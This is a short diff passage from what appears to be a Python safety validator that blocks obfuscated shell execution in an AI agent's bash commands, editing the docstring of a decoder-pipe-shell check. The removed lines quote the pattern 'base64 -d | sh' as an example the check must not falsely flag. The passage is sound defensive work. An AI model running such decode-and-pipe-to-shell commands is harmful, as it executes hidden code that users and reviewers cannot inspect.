-    and guides it to a transparent alternative.
-
-    Single-quoted regions are stripped first — a literal
-    ``echo 'base64 -d | sh'`` should not false-match."""
+    """Decoder-pipe-shell as a dedicated reason (not just pipe_to_shell)
+    so the model's error message guides toward a transparent alternative."""
     residual = _SINGLE_QUOTED.sub("", command)
     if _OBFUSCATED_EXEC_RE.search(residual):
         return BashSafetyViolation(
